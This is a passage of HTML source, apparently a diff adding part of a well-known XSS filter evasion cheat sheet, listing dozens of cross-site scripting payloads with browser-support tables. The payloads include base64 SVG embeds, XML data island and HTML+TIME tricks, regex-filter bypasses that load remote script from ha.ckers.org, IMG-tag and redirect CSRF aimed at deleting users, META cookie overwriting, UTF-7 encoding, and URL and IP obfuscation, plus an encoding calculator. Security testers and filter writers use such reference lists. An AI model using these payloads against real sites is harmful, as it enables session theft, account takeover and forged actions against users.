+<DIV ALIGN="CENTER">Browser support: [<span class="s">IE7.0</span>|<span class="s">IE6.0</span>|<span class="s">NS8.1-IE</span>] [<span class="s">NS8.1-G</span>|<span class="s">FF2.0</span>] [<span class="s">O9.02</span>]</DIV><BR><BR>
+
+<A NAME="XSS_Embed_SVG">You can EMBED SVG</A> which can contain your XSS vector.  This example only works in Firefox, but it's better than the above vector in Firefox because it does not require the user to have Flash turned on or installed. Thanks to <A HREF="http://rgaucher.info">nEUrOO</A> for this one.<BR>
+<TEXTAREA COLS=45 ROWS=3>&lt;EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" AllowScriptAccess="always"&gt;&lt;/EMBED&gt;</TEXTAREA><BR>
+<DIV ALIGN="CENTER">Browser support: [<span class="ns">IE7.0</span>|<span class="ns">IE6.0</span>|<span class="ns">NS8.1-IE</span>] [<span class="s">NS8.1-G</span>|<span class="s">FF2.0</span>] [<span class="ns">O9.02</span>]</DIV><BR><BR>
+
+
+<A NAME="XSS_Action_Script">Using ActionScript</A> inside flash can obfuscate your XSS vector:<BR>
+<TEXTAREA COLS=45 ROWS=3>a="get";&#10;b="URL(\"";&#10;c="javascript:";&#10;d="alert('XSS');\")";&#10;eval(a+b+c+d);</TEXTAREA><BR>
+<DIV ALIGN="CENTER">Browser support: [<span class="s">IE7.0</span>|<span class="s">IE6.0</span>|<span class="s">NS8.1-IE</span>] [<span class="s">NS8.1-G</span>|<span class="s">FF2.0</span>] [<span class="s">O9.02</span>]</DIV><BR><BR>
+
+<A NAME="XSS_XML_namespace">XML namespace</A>. The htc file must be located on the same server as your XSS vector:<BR>
+<TEXTAREA COLS=45 ROWS=3>&lt;HTML xmlns:xss&gt;
+  &lt;?import namespace="xss" implementation="http://ha.ckers.org/xss.htc"&gt;
+  &lt;xss:xss&gt;XSS&lt;/xss:xss&gt;
+&lt;/HTML&gt;</TEXTAREA><BR>
+<DIV ALIGN="CENTER">Browser support: [<span class="s">IE7.0</span>|<span class="s">IE6.0</span>|<span class="s">NS8.1-IE</span>] [<span class="ns">NS8.1-G</span>|<span class="ns">FF2.0</span>] [<span class="ns">O9.02</span>]</DIV><BR><BR>
+
+<A NAME="XSS_XML_data_island">XML data island</A> with CDATA obfuscation (this XSS attack works only in IE and Netscape 8.1 in IE rendering engine mode) - vector found by <A HREF="http://www.sec-consult.html">Sec Consult</A> while auditing Yahoo:<BR>
+<TEXTAREA COLS=45 ROWS=3>&lt;XML ID=I&gt;&lt;X&gt;&lt;C&gt;&lt;![CDATA[&lt;IMG SRC="javas]]&gt;&lt;![CDATA[cript:alert('XSS');"&gt;]]&gt;
+&lt;/C&gt;&lt;/X&gt;&lt;/xml&gt;&lt;SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML&gt;&lt;/SPAN&gt;</TEXTAREA><BR>
+<DIV ALIGN="CENTER">Browser support: [<span class="ns">IE7.0</span>|<span class="s">IE6.0</span>|<span class="s">NS8.1-IE</span>] [<span class="ns">NS8.1-G</span>|<span class="ns">FF2.0</span>] [<span class="ns">O9.02</span>]</DIV><BR><BR>
+
+<A NAME="XSS_XML_data_island_comment">XML data island with comment obfuscation</A> (this is another take on the same exploit that doesn't use CDATA fields, but rather uses comments to break up the javascript directive):<BR>
+<TEXTAREA COLS=45 ROWS=3>&lt;XML ID="xss"&gt;&lt;I&gt;&lt;B&gt;&amp;lt;IMG SRC="javas&lt;!-- --&gt;cript:alert('XSS')"&amp;gt;&lt;/B&gt;&lt;/I&gt;&lt;/XML&gt;
+&lt;SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"&gt;&lt;/SPAN&gt;</TEXTAREA><BR>
+<DIV ALIGN="CENTER">Browser support: [<span class="ns">IE7.0</span>|<span class="s">IE6.0</span>|<span class="s">NS8.1-IE</span>] [<span class="ns">NS8.1-G</span>|<span class="ns">FF2.0</span>] [<span class="ns">O9.02</span>]</DIV><BR><BR>
+
+<A NAME="XSS_Local_XML">Locally hosted XML with embedded JavaScript</A> that is generated using an XML data island.  This is the same as above but instead referrs to a locally hosted (must be on the same server) XML file that contains your cross site scripting vector.  You can see the result <A HREF="xssxmltest.html">here</A>:<BR>
+<TEXTAREA COLS=45 ROWS=3>&lt;XML SRC="xsstest.xml" ID=I&gt;&lt;/XML&gt;
+&lt;SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML&gt;&lt;/SPAN&gt;</TEXTAREA><BR>
+<DIV ALIGN="CENTER">Browser support: [<span class="ns">IE7.0</span>|<span class="s">IE6.0</span>|<span class="s">NS8.1-IE</span>] [<span class="ns">NS8.1-G</span>|<span class="ns">FF2.0</span>] [<span class="ns">O9.02</span>]</DIV><BR><BR>
+
+<A NAME="XSS_HTML_plus_time">HTML+TIME in XML</A>.  This is how <A HREF="http://www.greymagic.com/security/advisories/gm005-mc/">Grey Magic hacked Hotmail and Yahoo!</A>.  This only works in Internet Explorer and Netscape 8.1 in IE rendering engine mode and remember that you need to be between HTML and BODY tags for this to work:<BR>
+<TEXTAREA COLS=45 ROWS=3>&lt;HTML&gt;&lt;BODY&gt;
+&lt;?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"&gt;
+&lt;?import namespace="t" implementation="#default#time2"&gt;
+&lt;t:set attributeName="innerHTML" to="XSS&amp;lt;SCRIPT DEFER&amp;gt;alert(&amp;quot;XSS&amp;quot;)&amp;lt;/SCRIPT&amp;gt;"&gt;
+&lt;/BODY&gt;&lt;/HTML&gt;</TEXTAREA><BR>
+<DIV ALIGN="CENTER">Browser support: [<span class="s">IE7.0</span>|<span class="s">IE6.0</span>|<span class="s">NS8.1-IE</span>] [<span class="ns">NS8.1-G</span>|<span class="ns">FF2.0</span>] [<span class="ns">O9.02</span>]</DIV><BR><BR>
+
+<A NAME="XSS_rename">Assuming you can only fit in a few characters and it filters against ".js" you can rename your JavaScript</A> file to an image as an XSS vector:<BR>
+<TEXTAREA COLS=45 ROWS=3>&lt;SCRIPT SRC="http://ha.ckers.org/xss.jpg"&gt;&lt;/SCRIPT&gt;</TEXTAREA><BR>
+<DIV ALIGN="CENTER">Browser support: [<span class="s">IE7.0</span>|<span class="s">IE6.0</span>|<span class="s">NS8.1-IE</span>] [<span class="s">NS8.1-G</span>|<span class="s">FF2.0</span>] [<span class="s">O9.02</span>]</DIV><BR><BR>
+
+<A NAME="XSS_SSI">SSI</A> (Server Side Includes) requires SSI to be installed on the server to use this XSS vector.  I probably don't need to mention this, but if you can run commands on the server there are no doubt much more serious issues:<BR>
+<TEXTAREA COLS=45 ROWS=3>&lt;!--#exec cmd="/bin/echo '&lt;SCR'"--&gt;&lt;!--#exec cmd="/bin/echo 'IPT SRC=http://ha.ckers.org/xss.js&gt;&lt;/SCRIPT&gt;'"--&gt;</TEXTAREA><BR>
+<DIV ALIGN="CENTER">Browser support: [<span class="s">IE7.0</span>|<span class="s">IE6.0</span>|<span class="s">NS8.1-IE</span>] [<span class="s">NS8.1-G</span>|<span class="s">FF2.0</span>] [<span class="s">O9.02</span>]</DIV><BR><BR>
+
+<A NAME="XSS_PHP">PHP</A> - requires PHP to be installed on the server to use this XSS vector.  Again, if you can run any scripts remotely like this, there are probably much more dire issues:<BR>
+<TEXTAREA COLS=45 ROWS=3>&lt;? echo('&lt;SCR)';
+echo('IPT&gt;alert("XSS")&lt;/SCRIPT&gt;'); ?&gt;</TEXTAREA><BR>
+<DIV ALIGN="CENTER">Browser support: [<span class="s">IE7.0</span>|<span class="s">IE6.0</span>|<span class="s">NS8.1-IE</span>] [<span class="s">NS8.1-G</span>|<span class="s">FF2.0</span>] [<span class="s">O9.02</span>]</DIV><BR><BR>
+
+<A NAME="XSS_IMG_CSRF">IMG Embedded</A> commands - this works when the webpage where this is injected (like a web-board) is behind password protection and that password protection works with other commands on the same domain.  This can be used to delete users, add users (if the user who visits the page is an administrator), send credentials elsewhere, etc....  This is one of the lesser used but more useful XSS vectors:<BR>
+<TEXTAREA COLS=45 ROWS=3>&lt;IMG SRC="http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode"&gt;</TEXTAREA><BR>
+<DIV ALIGN="CENTER">Browser support: [<span class="s">IE7.0</span>|<span class="s">IE6.0</span>|<span class="s">NS8.1-IE</span>] [<span class="s">NS8.1-G</span>|<span class="s">FF2.0</span>] [<span class="s">O9.02</span>]</DIV><BR><BR>
+
+<A NAME="XSS_IMG_CSRF_2">IMG Embedded commands part II</A> - this is more scary because there are absolutely no identifiers that make it look suspicious other than it is not hosted on your own domain.  The vector uses a 302 or 304 (others work too) to redirect the image back to a command.  So a normal &lt;IMG SRC="http://badguy.com/a.jpg"&gt; could actually be an attack vector to run commands as the user who views the image link.  Here is the .htaccess (under Apache) line to accomplish the vector (thanks to Timo for part of this):<BR>
+<TEXTAREA COLS=45 ROWS=3>Redirect 302 /a.jpg http://victimsite.com/admin.asp&amp;deleteuser</TEXTAREA><BR>
+<DIV ALIGN="CENTER">Browser support: [<span class="s">IE7.0</span>|<span class="s">IE6.0</span>|<span class="s">NS8.1-IE</span>] [<span class="s">NS8.1-G</span>|<span class="s">FF2.0</span>] [<span class="s">O9.02</span>]</DIV><BR><BR>
+
+<A NAME="XSS_Cookie_manipulation">Cookie manipulation</A> - admittidly this is pretty obscure but I have seen a few examples where &lt;META is allowed and you can use it to overwrite cookies.  There are other examples of sites where instead of fetching the username from a database it is stored inside of a cookie to be displayed only to the user who visits the page.  With these two scenarios combined you can modify the victim's cookie which will be displayed back to them as JavaScript (you can also use this to log people out or change their user states, get them to log in as you, etc...):<BR>
+<TEXTAREA COLS=45 ROWS=3>&lt;META HTTP-EQUIV="Set-Cookie" Content="USERID=&amp;lt;SCRIPT&amp;gt;alert('XSS')&amp;lt;/SCRIPT&amp;gt;"&gt;</TEXTAREA><BR>
+<DIV ALIGN="CENTER">Browser support: [<span class="s">IE7.0</span>|<span class="s">IE6.0</span>|<span class="s">NS8.1-IE</span>] [<span class="s">NS8.1-G</span>|<span class="s">FF2.0</span>] [<span class="s">O9.02</span>]</DIV><BR><BR>
+
+<A NAME="XSS_UTF-7">UTF-7</A> encoding - if the page that the XSS resides on doesn't provide a page charset header, or any browser that is set to UTF-7 encoding can be exploited with the following (Thanks to <A HREF="http://www.pixel-apes.com/">Roman Ivanov</A> for this one).  Click <A HREF="utf-7.html">here</A> for an example (you don't need the charset statement if the user's browser is set to auto-detect and there is no overriding content-types on the page in Internet Explorer and Netscape 8.1 in IE rendering engine mode). This does not work in any modern browser without changing the encoding type which is why it is marked as completely unsupported.  <A HREF="http://seclists.org/lists/fulldisclosure/2005/Dec/1107.html">Watchfire found this hole</A> in Google's custom 404 script.:
+<TEXTAREA COLS=45 ROWS=3>&lt;HEAD&gt;&lt;META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"&gt; &lt;/HEAD&gt;+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-</TEXTAREA><BR>
+<DIV ALIGN="CENTER">Browser support: [<span class="ns">IE7.0</span>|<span class="ns">IE6.0</span>|<span class="ns">NS8.1-IE</span>] [<span class="ns">NS8.1-G</span>|<span class="ns">FF2.0</span>] [<span class="ns">O9.02</span>]</DIV><BR><BR>
+
+
+</UL><BR><BR>
+
+
+<B>XSS using HTML quote encapsulation:</B><UL>
+
+This was tested in IE, your mileage may vary.  For performing XSS on sites that allow "&lt;SCRIPT&gt;" but don't allow "&lt;SCRIPT SRC..." by way of a regex filter "/&lt;script[^>]+src/i":<BR>
+<TEXTAREA COLS=45 ROWS=3>&lt;SCRIPT a="&gt;" SRC="http://ha.ckers.org/xss.js"&gt;&lt;/SCRIPT&gt;</TEXTAREA><BR>
+<DIV ALIGN="CENTER">Browser support: [<span class="s">IE7.0</span>|<span class="s">IE6.0</span>|<span class="s">NS8.1-IE</span>] [<span class="s">NS8.1-G</span>|<span class="s">FF2.0</span>] [<span class="s">O9.02</span>]</DIV><BR><BR>
+
+For performing XSS on sites that allow "&lt;SCRIPT&gt;" but don't allow "&lt;script src..." by way of a regex filter "/&lt;script((\s+\w+(\s*=\s*(?:"(.)*?"|'(.)*?'|[^'"&gt;\s]+))?)+\s*|\s*)src/i" (this is an important one, because I've seen this regex in the wild):<BR>
+<TEXTAREA COLS=45 ROWS=3>&lt;SCRIPT ="&gt;" SRC="http://ha.ckers.org/xss.js"&gt;&lt;/SCRIPT&gt;</TEXTAREA><BR>
+<DIV ALIGN="CENTER">Browser support: [<span class="s">IE7.0</span>|<span class="s">IE6.0</span>|<span class="s">NS8.1-IE</span>] [<span class="s">NS8.1-G</span>|<span class="s">FF2.0</span>] [<span class="s">O9.02</span>]</DIV><BR><BR>
+
+Another XSS to evade the same filter, "/&lt;script((\s+\w+(\s*=\s*(?:"(.)*?"|'(.)*?'|[^'"&gt;\s]+))?)+\s*|\s*)src/i":<BR>
+<TEXTAREA COLS=45 ROWS=3>&lt;SCRIPT a=">" '' SRC="http://ha.ckers.org/xss.js"&gt;&lt;/SCRIPT&gt;</TEXTAREA><BR>
+<DIV ALIGN="CENTER">Browser support: [<span class="s">IE7.0</span>|<span class="s">IE6.0</span>|<span class="s">NS8.1-IE</span>] [<span class="s">NS8.1-G</span>|<span class="s">FF2.0</span>] [<span class="s">O9.02</span>]</DIV><BR><BR>
+
+Yet another XSS to evade the same filter, "/&lt;script((\s+\w+(\s*=\s*(?:"(.)*?"|'(.)*?'|[^'"&gt;\s]+))?)+\s*|\s*)src/i".  I know I said I wasn't goint to discuss mitigation techniques but the only thing I've seen work for this XSS example if you still want to allow &lt;SCRIPT&gt; tags but not remote script is a state machine (and of course there are other ways to get around this if they allow &lt;SCRIPT&gt; tags):<BR>
+<TEXTAREA COLS=45 ROWS=3>&lt;SCRIPT "a='>'" SRC="http://ha.ckers.org/xss.js"&gt;&lt;/SCRIPT&gt;</TEXTAREA><BR>
+<DIV ALIGN="CENTER">Browser support: [<span class="s">IE7.0</span>|<span class="s">IE6.0</span>|<span class="s">NS8.1-IE</span>] [<span class="s">NS8.1-G</span>|<span class="s">FF2.0</span>] [<span class="s">O9.02</span>]</DIV><BR><BR>
+
+And one last XSS attack to evade, "/&lt;script((\s+\w+(\s*=\s*(?:"(.)*?"|'(.)*?'|[^'"&gt;\s]+))?)+\s*|\s*)src/i" using grave accents (again, doesn't work in Firefox):<BR>
+<TEXTAREA COLS=45 ROWS=3>&lt;SCRIPT a=`>` SRC="http://ha.ckers.org/xss.js"&gt;&lt;/SCRIPT&gt;</TEXTAREA><BR>
+<DIV ALIGN="CENTER">Browser support: [<span class="s">IE7.0</span>|<span class="s">IE6.0</span>|<span class="s">NS8.1-IE</span>] [<span class="ns">NS8.1-G</span>|<span class="ns">FF2.0</span>] [<span class="ns">O9.02</span>]</DIV><BR><BR>
+
+Here's an XSS example that bets on the fact that the regex won't catch a matching pair of quotes but will rather find any quotes to terminate a parameter string improperly:<BR>
+<TEXTAREA COLS=45 ROWS=3>&lt;SCRIPT a=">'>" SRC="http://ha.ckers.org/xss.js"&gt;&lt;/SCRIPT&gt;</TEXTAREA><BR>
+<DIV ALIGN="CENTER">Browser support: [<span class="s">IE7.0</span>|<span class="s">IE6.0</span>|<span class="s">NS8.1-IE</span>] [<span class="s">NS8.1-G</span>|<span class="s">FF2.0</span>] [<span class="s">O9.02</span>]</DIV><BR><BR>
+
+
+This XSS still worries me, as it would be nearly impossible to stop this without blocking all active content:<BR>
+<TEXTAREA COLS=45 ROWS=3>&lt;SCRIPT>document.write("&lt;SCRI");&lt;/SCRIPT&gt;PT SRC="http://ha.ckers.org/xss.js"&gt;&lt;/SCRIPT&gt;</TEXTAREA><BR>
+<DIV ALIGN="CENTER">Browser support: [<span class="s">IE7.0</span>|<span class="s">IE6.0</span>|<span class="s">NS8.1-IE</span>] [<span class="s">NS8.1-G</span>|<span class="s">FF2.0</span>] [<span class="s">O9.02</span>]</DIV><BR><BR>
+
+</UL><BR><BR>
+
+
+<B>URL string evasion (assuming "http://www.google.com/" is programmatically disallowed):</B><UL>
+
+IP verses hostname:<BR>
+<TEXTAREA COLS=45 ROWS=3>&lt;A HREF="http://66.102.7.147/"&gt;XSS&lt;/A&gt;</TEXTAREA><BR>
+<DIV ALIGN="CENTER">Browser support: [<span class="s">IE7.0</span>|<span class="s">IE6.0</span>|<span class="s">NS8.1-IE</span>] [<span class="s">NS8.1-G</span>|<span class="s">FF2.0</span>] [<span class="s">O9.02</span>]</DIV><BR><BR>
+
+URL encoding:<BR>
+<TEXTAREA COLS=45 ROWS=3>&lt;A HREF="http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D"&gt;XSS&lt;/A&gt;</TEXTAREA><BR>
+<DIV ALIGN="CENTER">Browser support: [<span class="s">IE7.0</span>|<span class="s">IE6.0</span>|<span class="s">NS8.1-IE</span>] [<span class="s">NS8.1-G</span>|<span class="ns">FF2.0</span>] [<span class="s">O9.02</span>]</DIV><BR><BR>
+
+Dword encoding (Note: there are other of variations of Dword encoding - see the <A HREF="#ipobfuscate">IP Obfuscation calculator below</A> for more details):<BR>
+<TEXTAREA COLS=45 ROWS=3>&lt;A HREF="http://1113982867/"&gt;XSS&lt;/A&gt;</TEXTAREA><BR>
+<DIV ALIGN="CENTER">Browser support: [<span class="s">IE7.0</span>|<span class="s">IE6.0</span>|<span class="s">NS8.1-IE</span>] [<span class="s">NS8.1-G</span>|<span class="s">FF2.0</span>] [<span class="s">O9.02</span>]</DIV><BR><BR>
+
+Hex encoding (the total size of each number allowed is somewhere in the neighborhood of 240 total characters as you can see on the second digit, and since the hex number is between 0 and F the leading zero on the third hex quotet is not required):<BR>
+<TEXTAREA COLS=45 ROWS=3>&lt;A HREF="http://0x42.0x0000066.0x7.0x93/"&gt;XSS&lt;/A&gt;</TEXTAREA><BR>
+<DIV ALIGN="CENTER">Browser support: [<span class="s">IE7.0</span>|<span class="s">IE6.0</span>|<span class="s">NS8.1-IE</span>] [<span class="s">NS8.1-G</span>|<span class="s">FF2.0</span>] [<span class="s">O9.02</span>]</DIV><BR><BR>
+
+Octal encoding (again padding is allowed, although you must keep it above 4 total characters per class - as in class A, class B, etc...):<BR>
+<TEXTAREA COLS=45 ROWS=3>&lt;A HREF="http://0102.0146.0007.00000223/"&gt;XSS&lt;/A&gt;</TEXTAREA><BR>
+<DIV ALIGN="CENTER">Browser support: [<span class="s">IE7.0</span>|<span class="s">IE6.0</span>|<span class="s">NS8.1-IE</span>] [<span class="s">NS8.1-G</span>|<span class="s">FF2.0</span>] [<span class="s">O9.02</span>]</DIV><BR><BR>
+
+Mixed encoding (let's mix and match base encoding and throw in some tabs and newlines - why browsers allow this, I'll never know).  The tabs and newlines only work if this is encapsulated with quotes:<BR>
+<TEXTAREA COLS=45 ROWS=3>&lt;A HREF="h&#x0A;tt&#09;p://6&amp;#9;6.000146.0x7.147/"&gt;XSS&lt;/A&gt;</TEXTAREA><BR>
+<DIV ALIGN="CENTER">Browser support: [<span class="s">IE7.0</span>|<span class="s">IE6.0</span>|<span class="s">NS8.1-IE</span>] [<span class="s">NS8.1-G</span>|<span class="s">FF2.0</span>] [<span class="s">O9.02</span>]</DIV><BR><BR>
+
+Protocol resolution bypass (// translates to http:// which saves a few more bytes).  This is really handy when space is an issue too (two less characters can go a long way) and can easily bypass regex like "(ht|f)tp(s)?://" (thanks to <A HREF="http://planetOzh.com/">Ozh</A> for part of this one).  You can also change the "//" to "\\".  You do need to keep the slashes in place, however, otherwise this will be interpreted as a relative path URL.<BR>
+<TEXTAREA COLS=45 ROWS=3>&lt;A HREF="//www.google.com/"&gt;XSS&lt;/A&gt;</TEXTAREA><BR>
+<DIV ALIGN="CENTER">Browser support: [<span class="s">IE7.0</span>|<span class="s">IE6.0</span>|<span class="s">NS8.1-IE</span>] [<span class="s">NS8.1-G</span>|<span class="s">FF2.0</span>] [<span class="s">O9.02</span>]</DIV><BR><BR>
+
+Google "feeling lucky" part 1.  Firefox uses Google's "feeling lucky" function to redirect the user to any keywords you type in.  So if your exploitable page is the top for some random keyword (as you see here) you can use that feature against any Firefox user.  This uses Firefox's "keyword:" protocol.  You can concatinate several keywords by using something like the following "keyword:XSS+RSnake" for instance.  This no longer works within Firefox as of 2.0.
+<TEXTAREA COLS=45 ROWS=3>&lt;A HREF="//google"&gt;XSS&lt;/A&gt;</TEXTAREA><BR>
+<DIV ALIGN="CENTER">Browser support: [<span class="ns">IE7.0</span>|<span class="ns">IE6.0</span>|<span class="ns">NS8.1-IE</span>] [<span class="s">NS8.1-G</span>|<span class="ns">FF2.0</span>] [<span class="ns">O9.02</span>]</DIV><BR><BR>
+
+Google "feeling lucky" part 2.  This uses a very tiny trick that appears to work Firefox only, because if it's implementation of the "feeling lucky" function.  Unlike the next one this does not work in Opera because Opera believes that this is the old HTTP Basic Auth phishing attack, which it is not.  It's simply a malformed URL.  If you click okay on the dialogue it will work, but as a result of the erroneous dialogue box I am saying that this is not supported in Opera, and it is no longer supported in Firefox as of 2.0:<BR>
+<TEXTAREA COLS=45 ROWS=3>&lt;A HREF="http://ha.ckers.org@google"&gt;XSS&lt;/A&gt;</TEXTAREA><BR>
+<DIV ALIGN="CENTER">Browser support: [<span class="ns">IE7.0</span>|<span class="ns">IE6.0</span>|<span class="ns">NS8.1-IE</span>] [<span class="ns">NS8.1-G</span>|<span class="ns">FF2.0</span>] [<span class="ns">O9.02</span>]</DIV><BR><BR>
+
+Google "feeling lucky" part 3.  This uses a malformed URL that appears to work in Firefox and Opera only, because if their implementation of the "feeling lucky" function.  Like all of the above it requires that you are #1 in Google for the keyword in question (in this case "google"):<BR>
+<TEXTAREA COLS=45 ROWS=3>&lt;A HREF="http://google:ha.ckers.org"&gt;XSS&lt;/A&gt;</TEXTAREA><BR>
+<DIV ALIGN="CENTER">Browser support: [<span class="ns">IE7.0</span>|<span class="ns">IE6.0</span>|<span class="ns">NS8.1-IE</span>] [<span class="ns">NS8.1-G</span>|<span class="ns">FF2.0</span>] [<span class="s">O9.02</span>]</DIV><BR><BR>
+
+Removing cnames (when combined with the above URL, removing "www." will save an additional 4 bytes for a total byte savings of 9 for servers that have this set up properly):<BR>
+<TEXTAREA COLS=45 ROWS=3>&lt;A HREF="http://google.com/"&gt;XSS&lt;/A&gt;</TEXTAREA><BR>
+<DIV ALIGN="CENTER">Browser support: [<span class="s">IE7.0</span>|<span class="s">IE6.0</span>|<span class="s">NS8.1-IE</span>] [<span class="s">NS8.1-G</span>|<span class="s">FF2.0</span>] [<span class="s">O9.02</span>]</DIV><BR><BR>
+
+Extra dot for absolute DNS:<BR>
+<TEXTAREA COLS=45 ROWS=3>&lt;A HREF="http://www.google.com./"&gt;XSS&lt;/A&gt;</TEXTAREA><BR>
+<DIV ALIGN="CENTER">Browser support: [<span class="s">IE7.0</span>|<span class="s">IE6.0</span>|<span class="s">NS8.1-IE</span>] [<span class="s">NS8.1-G</span>|<span class="s">FF2.0</span>] [<span class="s">O9.02</span>]</DIV><BR><BR>
+
+JavaScript link location:<BR>
+<TEXTAREA COLS=45 ROWS=3>&lt;A HREF="javascript:document.location='http://www.google.com/'"&gt;XSS&lt;/A&gt;</TEXTAREA><BR>
+<DIV ALIGN="CENTER">Browser support: [<span class="s">IE7.0</span>|<span class="s">IE6.0</span>|<span class="s">NS8.1-IE</span>] [<span class="s">NS8.1-G</span>|<span class="s">FF2.0</span>] [<span class="s">O9.02</span>]</DIV><BR><BR>
+
+Content replace as attack vector (assuming "http://www.google.com/" is programmatically replaced with nothing).  I actually used a similar attack vector against a several separate real world XSS filters by using the conversion filter itself (<A HREF="http://quickwired.com/kallahar/smallprojects/php_xss_filter_function.php">here is an example</A>) to help create the attack vector (IE: "java&amp;#x26;#x09;script:" was converted into "java&amp;#x09;script:", which renders in IE, Netscape 8.1+ in secure site mode and Opera):<BR>
+<TEXTAREA COLS=45 ROWS=3>&lt;A HREF="http://www.gohttp://www.google.com/ogle.com/"&gt;XSS&lt;/A&gt;</TEXTAREA><BR>
+<DIV ALIGN="CENTER">Browser support: [<span class="s">IE7.0</span>|<span class="s">IE6.0</span>|<span class="s">NS8.1-IE</span>] [<span class="s">NS8.1-G</span>|<span class="s">FF2.0</span>] [<span class="s">O9.02</span>]</DIV><BR><BR>
+
+</UL>
+
+
+<B>Character Encoding:</B><UL>
+
+All the possible combinations of the character "&lt;" in HTML and JavaScript (in UTF-8).  Most of these won't render out of the box, but many of them can get rendered in certain circumstances as seen above (standards are great, aren't they?):<BR>
+<TEXTAREA COLS=45 ROWS=3>&lt;
+%3C
+&amp;lt
+&amp;lt;
+&amp;LT
+&amp;LT;
+&amp;#60
+&amp;#060
+&amp;#0060
+&amp;#00060
+&amp;#000060
+&amp;#0000060
+&amp;#60;
+&amp;#060;
+&amp;#0060;
+&amp;#00060;
+&amp;#000060;
+&amp;#0000060;
+&amp;#x3c
+&amp;#x03c
+&amp;#x003c
+&amp;#x0003c
+&amp;#x00003c
+&amp;#x000003c
+&amp;#x3c;
+&amp;#x03c;
+&amp;#x003c;
+&amp;#x0003c;
+&amp;#x00003c;
+&amp;#x000003c;
+&amp;#X3c
+&amp;#X03c
+&amp;#X003c
+&amp;#X0003c
+&amp;#X00003c
+&amp;#X000003c
+&amp;#X3c;
+&amp;#X03c;
+&amp;#X003c;
+&amp;#X0003c;
+&amp;#X00003c;
+&amp;#X000003c;
+&amp;#x3C
+&amp;#x03C
+&amp;#x003C
+&amp;#x0003C
+&amp;#x00003C
+&amp;#x000003C
+&amp;#x3C;
+&amp;#x03C;
+&amp;#x003C;
+&amp;#x0003C;
+&amp;#x00003C;
+&amp;#x000003C;
+&amp;#X3C
+&amp;#X03C
+&amp;#X003C
+&amp;#X0003C
+&amp;#X00003C
+&amp;#X000003C
+&amp;#X3C;
+&amp;#X03C;
+&amp;#X003C;
+&amp;#X0003C;
+&amp;#X00003C;
+&amp;#X000003C;
+\x3c
+\x3C
+\u003c
+\u003C</TEXTAREA><BR><BR>
+</UL>
+
+<BR><BR>
+<center><h2><A NAME="XSScalc">Character Encoding Calculator</A></h2></center>
+<FORM NAME="XSS" ACTION="">
+<b>ASCII Text:</b>
+
+            <UL> 
+<TEXTAREA name="ascii" COLS=45 ROWS=3>Enter your XSS here</TEXTAREA><BR><input type="button" value="Encode" onclick="encode()">
+<input type="reset" value="Clear">
+            </UL>
+<b>Hex Value:</b>
+            <UL> 
+URL:<BR>
+<input type="text" name="hex" size="60"><BR><input type="button" value="Decode Hex to ASCII" onclick="decode()" size="50"><BR>
+HTML (with semicolons):<BR>
+<input type="text" name="hexhtml" size="60"><BR><input type="button" value="Decode Hex Entities to ASCII" onclick="convertHexToASCII()" size="50"><BR>
+            </UL>
+
+<b>Decimal Value:</b>
+            <UL> 
+HTML (without semicolons):<BR>
+<input type="text" name="unicode" size="60"><BR>
+<input type="button" value="Decode Dec to ASCII" onclick="convertToASCII()">
+            </UL>
+
+<b>Base64 Value</b> (<A HREF="http://ostermiller.org/calc/encode.html">a more robust base64 calculator can be found here</A>)
+            <UL> 
+Base64:<BR>
+<input type="text" name="base64" size="60"><BR>
+<input type="button" value="Decode Base64" onclick="document.XSS.ascii.value=decodeBase64(document.XSS.base64.value);">
+            </UL>
+</FORM>
+<BR><BR>
+<DIV ALIGN="CENTER"><H2><A NAME="ipobfuscate">IP Obfuscation Calculator</A></H2></DIV>
+
+<FORM NAME="IP" ACTION="">
+<b>IP Address:</b>
+
+            <UL> 
+<input type="text" name="ip" size="30" value="127.0.0.1"><input type="text" size=1 name="level" value="0"> : dword level
+<BR><input type="button" value="Encode" onclick="convet(ip.value,level.value);">
+<input type="reset" value="Clear">
+            </UL>
+
+<b>Dword Address:</b>
+            <UL>
+<input type="text" name="ipdword" size="30">
+            </UL>
+
+<b>Hex Address:</b>
+            <UL>
+<input type="text" name="iphex" size="30">
+            </UL>
+
+<b>Octal Address:</b>
+            <UL>
+<input type="text" name="ipoctal" size="30">
+            </UL>
+          </FORM>
+<BR><BR>
+
+
+<DIV ALIGN="CENTER"><H2>Browser support reference table:</H2><BR>
+  <TABLE border="1" width="400">
+    <TR>
+      <TD>IE7.0<TD>
+      <TD>Vector works in Internet Explorer 7.0.  Most recently tested with Internet Explorer 7.0.5700.6 RC1, Windows XP Professional SP2.<TD>
+    </TR>
+    <TR>
+      <TD>IE6.0<TD>
+      <TD>Vector works in Internet Explorer.  Most recently tested with Internet Explorer 6.0.28.1.1106CO, SP2 on Windows 2000.<TD>
+    </TR>
+    <TR>
+      <TD>NS8.1-IE<TD>
+      <TD>Vector works in Netscape 8.1+ in IE rendering engine mode.  Most recently tested with Netscape 8.1 on Windows XP Professional.  This used to be called trusted mode, but Netscape has changed it's security model away from the trusted/untrusted model and has opted towards Gecko as a default and IE as an option.<TD>
+    </TR>
+    <TR>
+      <TD>NS8.1-G<TD>
+      <TD>Vector works in Netscape 8.1+ in the Gecko rendering engine mode. Most recently tested with Netscape 8.1 on Windows XP Professional<TD>
+    </TR>
+    <TR>
+      <TD>FF2.0<TD>
+      <TD>Vector works in Mozilla's Gecko rendering engine, used by Firefox.  Most recently tested with Firefox 2.0.0.2 on Windows XP Professional.<TD>
